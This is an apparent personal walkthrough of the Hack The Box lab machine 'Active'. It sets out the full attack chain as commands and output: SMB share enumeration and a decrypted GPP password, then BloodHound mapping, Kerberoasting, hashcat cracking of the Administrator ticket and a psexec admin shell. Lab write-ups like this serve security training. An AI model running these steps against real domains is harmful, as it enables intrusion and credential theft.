## Active

### keyword

gpp-decrypt, smbmap , sharehound

### information



###  smbmap

smbmap -H active.htb

smbmap -H 10.10.10.100
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.100...
[+] IP: 10.10.10.100:445        Name: active.htb
        Disk                                                    Permissions

----                                                    -----------
​        ADMIN$                                                  NO ACCESS
​        C$                                                      NO ACCESS
​        IPC$                                                    NO ACCESS
​        NETLOGON                                                NO ACCESS
​        Replication                                             READ ONLY
​        SYSVOL                                                  NO ACCESS
​        Users                                                   NO ACCESS

#### download the group.xml

smbmap -H 10.10.10.100 -R  Replication -A Group.xml

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

#### decryp gpp

```shell
root@#gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

GPPstillStandingStrong2k18
```

#### run remote command in windows

```bash
runas  /noprofile /netonly /user:active.htb\svc_tgs cmd

```

####  sharphound.exe 

sharphound.exe -c all   -target-domain  active.htb   -domaincontroler  10.10.10.100

open /opt/BloundHound/BloundHound

[Shortest Paths from Kerberoastable Users](#)

```bash
root@ens:~/htb/Active# GetUserSPNs.py  active.htb/svc_tgs:GPPstillStandingStrong2k18 -request  -ta
rget-domain active.htb -dc-ip 10.10.10.100

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon

------

active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 03:06:40  2018-07-31 01:17:40



$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$10adb52e3cee94be93456bd0a68b2a66$72b07da0025c1ca661928de57ff5ab74cbf96a7f8abedf870163658f73f61fe43f300cf57508d75899f73fa95577c30c6e658fad5f46a11055f0e6dd9a2d5e95bcd4a8d9a16d61bc642a724d0cc54888989ccf1473a348a2378e8377e13acae4f1a30ab076d95705d6cae6a148d47a98ab5678a5ccd23a0c7f0eb16a239debe93efb9e5e44c1274ec56e09cddf7d2bf0c90b8c8c8e040a32968f3142043a2f1455bd357de0c1b6f9e7cb42b3e08827fcdc5ed4ba8a403c47339bfd91d42e1d998b1848aed9a94b032d3893189863843e0b107496dde6a56e3816966f8657f3e077be2aa9442a36c736579efab7faa45b4614faf6f7ebf6ad21486e02946a6839ef96ec76ca4711afc3ab016ef96080efb1c5b96daa18c7dddf446f5bb0b883941b95b3fe0bba7fb86b6fd7a83596627715752be85f34340b279db266ebb67224efda12c8d1a3ed9d72aeafb7e78cd0978d16c94ca76e04dfdd6751a1cdb586e8c10b9b1f2dcdd6a76e3f679e1c5f4b7e93b775e32c0ab133339bfb8696bbfacab114819067fb99a9a87ec42479d3bcdb0eb646d631607a8320a0da8ad0a93c48b0a146732dbc9f24c8f03bc5658fbac2bf303b6d1af67088b0822991e49499daa274556b8aacfb61b0f8cf7b60abd0756f26a66bd3a2e0ecb09c824800a168713805ad8f3bac6ffb2e17010f3ca55595fc3bfa706c6a64e6a530dba29d52cd92e8af8b16122f2883747e635ed690755f431a4b45eaaff5ae5ff54d233f8ad1a6078139730df07c534986f0a57eab9f9707f8ad6dfedfda13d175e11dffcb001014afc76308f9458c934c4e62e40f414754196b73826428f4ae6179c7d4878b3d8736c4b88a9494871901164846d4dc1e5ffd3e7a4f79599bd60575923540e8a2c89654253a14318d16e1e92c086d0fca604d924568ce51f8ed19e9f27523c06f28967d942c63043bbb1367a0ad170684060c3c624d2a634cd91ca1486bcf7e70a80766fbd10226f2490b953dbc74fe8a6836eddf71b5ee54fb94a0eff32cf23c1358f5b4c17e16407e9c8b829bb651d60f5b64a2ea525f547f7c5aaa1297fd9c949b1cb5e69b63c0112f702866e0341568fa8195b47d9f7afac5ae6b2d2c29ad70c8244a2c1627be50b7099183563abeaec5e98800b9283c0b591bfb032a4d72a1f7faead55a7a498c7a1e93d6971cf3b955f0cd658e6ce6bf57b35ed82662e1635a235cc2426066c1fb31a19fa7578163b93a4f8a6730d2e9b8
```

#  hashcat 

hashcat  -m 13100  kerbot /usr/share/wordlists/rockyou.txt  --force
Ticketmaster1968

#  psexec get cmd 

psexec.py  active.htb/Administrator:Ticketmaster1968@10.10.10.100